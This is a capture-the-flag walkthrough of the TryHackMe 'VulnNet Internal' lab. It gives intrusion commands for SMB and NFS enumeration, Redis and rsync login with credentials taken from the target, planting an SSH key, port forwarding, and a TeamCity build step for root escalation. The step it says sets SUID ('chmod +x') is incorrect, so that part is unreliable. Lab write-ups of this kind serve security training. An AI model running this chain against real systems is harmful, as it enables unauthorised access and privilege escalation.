Room: [VulnNet Internal](https://tryhackme.com/room/vulnnetinternal)

Difficulty: Easy

Overview: This room is not has easy has it was supposed by the creator. Here you will explore different protocols, gathering information from one service to another until we get a reverse shell. At the end you will see a privesc through a JetBrains server project.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Let's start our enumeration fase by running “nmap” to check for all open ports on the target system:

```
nmap -sV -sC -p- vulnet.thm -oN nmap.txt

-sV  →  Probe open ports to determine service
-sC  →  Scan using the default set of scripts
-p-  →  Scan all ports
-oN  →  Save the ouput of the scan in a file
vulnet.thm → ip address of the room
```

![image](https://user-images.githubusercontent.com/76821053/131157981-faaf511c-9349-45d1-af00-10ab439f037b.png)

The system is running Samba. To enumerate smb shares we can use smbclient:

```
smbclient -L //vulnet.thm/
```

![image](https://user-images.githubusercontent.com/76821053/131158050-dbe06d70-5e2d-4f08-a38d-9735313e893a.png)

There is a share called “shares”. We can access it without credentials:

```
smbclient //vulnet.thm/shares -u Anonymous

mget  →  to download files
```

![image](https://user-images.githubusercontent.com/76821053/131158157-6a6e9754-687c-4eef-97ec-31ee18c3107d.png)

After downloading all the available files we have found the services.txt flag!

![image](https://user-images.githubusercontent.com/76821053/131158216-ee64a533-0937-422b-8b7e-e4ee7fe2128d.png)

![image](https://user-images.githubusercontent.com/76821053/131158185-98453767-5129-4133-a8ee-cb9878eab4cb.png)

The other .txt files had nothing of interest:

![image](https://user-images.githubusercontent.com/76821053/131158257-ef74ec33-e074-443c-8a95-8a8765594ae8.png)

After enumerating smb shares, we are going to mount a remote directory since the target system has NFS/mountd open ports: 

```
showmount -e 
```

![image](https://user-images.githubusercontent.com/76821053/131158609-eb0b878c-c552-4109-bb50-c0d303061b0c.png)

/opt/conf is being shared, so let's mount it on our system:

```
mkdir /tmp/conf

mount -t nfs -o id_address_of_room:/opt/conf /tmp/vuln -o nolock
```

![image](https://user-images.githubusercontent.com/76821053/131158648-85ff7806-8923-4911-a04d-762d4e081080.png)

The directory that we mounted is full of configurations files:

![image](https://user-images.githubusercontent.com/76821053/131158725-7157cce3-284d-46f9-a57f-c8f67e48155e.png)

We know that the target system is running "Redis", and inside redis.conf there is a password for it:

![image](https://user-images.githubusercontent.com/76821053/131158771-4646f72a-c915-4baf-b43b-4ff629ac5485.png)

I decided to download and install redis client to work with a better interface.  We can check [hacktricks website](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) for accessing the database.

```
./redis-cli -h vulnet.thm

auth B65Hx562F@ggAZ@F

keys *

get “internal flag”

lrange “authlist” 0 -4
```

When connected to the server we can authenticate:

![image](https://user-images.githubusercontent.com/76821053/131158846-87c273d7-e3b0-409e-86d8-5cc862130085.png)

To list the contents of the database use:

![image](https://user-images.githubusercontent.com/76821053/131158900-ad60b501-bb0b-4d00-81bf-d87f7e0a99d1.png)

To select and read contents:

![image](https://user-images.githubusercontent.com/76821053/131158923-f3f98efc-a4ca-4e92-80a2-bca09323af65.png)

We cannot read "authlist" the same way has the other contents. So, since redis databases are numbers starting from 0 we can use a different command:

![image](https://user-images.githubusercontent.com/76821053/131159158-fce5d442-35d2-4ad5-900f-5ea88495dfe6.png)

Inside "authlist" was a base64 encoded string. Let's decode it:

```
echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d
```

![image](https://user-images.githubusercontent.com/76821053/131159202-f4d676ad-a35e-4bc6-b2ec-588986d63f84.png)

We have found credentials for rsync service. 

Heading to rysnc service, first with we can try to list any directories available:

```
rsync -av --list-only rsync://vulnet.thm:873 
```

![image](https://user-images.githubusercontent.com/76821053/131159301-bcbae256-e28d-4ffc-b96a-014c21232a6e.png)

Making use of those credentials we can download the contents and analyze it:

```
rsync -av rsync://rsync-connect@10.10.30.242:873/files/ ./files
```

I saved it to /files and i found out that this was the home directory of sys-internal:

![image](https://user-images.githubusercontent.com/76821053/131159440-b3c8a462-70f1-49dd-8e76-a9fc714b5d65.png)

Here is the user.txt file:

![image](https://user-images.githubusercontent.com/76821053/131159588-3089110f-2e68-4e2c-a4c3-cad293584274.png)

We have read and write privileges with rsync to “sys-internal" home directory. We can create an ssh key and upload it to the target system:

```
ssh-keygen -f sys-internal
```

![image](https://user-images.githubusercontent.com/76821053/131159684-4ba8a83c-8e27-43d7-9b30-b1f7986c22f6.png)

First we have to create a file called authorized_keys and store the id_rsa.pub key inside and give it proper permissions.

In my case the id_rsa.pub is called sys-internal.pub:

```
touch authorized_keys

cat sys-internal.pub > authorized_keys

chmod 700 authorized_keys
```

![image](https://user-images.githubusercontent.com/76821053/131159947-4928e783-3ffa-45a6-b3f2-db22eb191ad9.png)

![image](https://user-images.githubusercontent.com/76821053/131159955-22a75230-3300-4c28-afb3-3d3410b7f2a8.png)

Let's go back to rsync and upload the authorized_keys file to .ssh directory of “sys-internal”:

```
rsync -av ~/Tryhackme/vulnet_internal/.ssh/authorized_keys rsync://rsync-connect@10.10.30.242:873/files/sys-internal/.ssh 
```

![image](https://user-images.githubusercontent.com/76821053/131160012-18c12f5c-a1fb-41a3-a4be-9172b3d2db40.png)

Finally we have to give to our sys-internal private key permissions and connect to the target machine:

```
chmod 600 sys-internal

ssh -i sys-internal sys-internal@vulnet.thm
```

![image](https://user-images.githubusercontent.com/76821053/131160098-4fcd509f-1637-41ee-b379-e110b74069a0.png)

When enumerating the machine i found an unsual folder:

![image](https://user-images.githubusercontent.com/76821053/131160180-70513ed5-9958-49e6-9eae-bac76656b000.png)

This folder seems to be of a webserver:

![image](https://user-images.githubusercontent.com/76821053/131160385-6ab89630-6423-4b28-94c2-09baa176dd76.png)

When searching through files we can see that a server is running has localhost at port 8111:

![image](https://user-images.githubusercontent.com/76821053/131160460-a48335a8-3f06-4472-80a8-418b122a2dff.png)

To check if this service is running on port 8111 we can use “ss” tool, this machine doesn't have netstat:

```
ss -tulpn
```

![image](https://user-images.githubusercontent.com/76821053/131160541-a705732f-7abc-4f73-9352-844be98e005a.png)

Since this service is running at a localhost port we can do a local port fowarding with ssh and access it in our attacker machine:

```
ssh -L 8111:localhost:8111 -i sys-internal sys-internal@vulnet.thm 
```

![image](https://user-images.githubusercontent.com/76821053/131160679-0b9de35d-3e7f-4401-9fb2-d5042acc29e2.png)

Now let's check what is on the localhost 8111 port:

![image](https://user-images.githubusercontent.com/76821053/131160707-14bf165d-a744-4cad-83fc-f4115c4d177e.png)

We have found a JetBrains TeamCity login portal with an information about “Super user”.

Searching for more information in the "Teamcity" folder i have found a log file with a token that will let us login into the webserver. This was one of the few log files that was readable:

![image](https://user-images.githubusercontent.com/76821053/131160967-554494b9-2d41-449e-b493-77d734044c03.png)

To login we just have to use a empty username field and use the token as a password:

![image](https://user-images.githubusercontent.com/76821053/131161005-c226d914-715d-466b-a7c8-bc3732bc3c7c.png)

One way to privesc in this machine is by creating a project and call it whatever you want:

![image](https://user-images.githubusercontent.com/76821053/131161115-a2c4b01a-109b-47db-82a8-1c173e9e436e.png)

On the "Build Step" tab we have to choose this parameters marked has red and we can change "bash" into an SUID binary to later escalate to root:

```
chmod +x /bin/bash
``` 

Just save the script and run the project:

![image](https://user-images.githubusercontent.com/76821053/131161307-d19ce3b0-d7e8-4fe1-9eb7-8b2ade8a81f3.png)

The script ran sucessfully:

![image](https://user-images.githubusercontent.com/76821053/131161346-4220673e-dc33-4cd0-af7b-6f613967f1c0.png)

Now in the target machine if we check for SUID binaries on the system we will have /bin/bash in there:

![image](https://user-images.githubusercontent.com/76821053/131161404-5cc8511d-591d-40c9-ad6b-929149b1bcf9.png)

To elevate our privileges to “root” we just need to run the SUID binary that we have created:

```
/bin/bash -p
```

![image](https://user-images.githubusercontent.com/76821053/131161451-4b7a24d8-f021-40e0-82c2-035e146b22d4.png)

Success the last flag was in “root” home directory!

































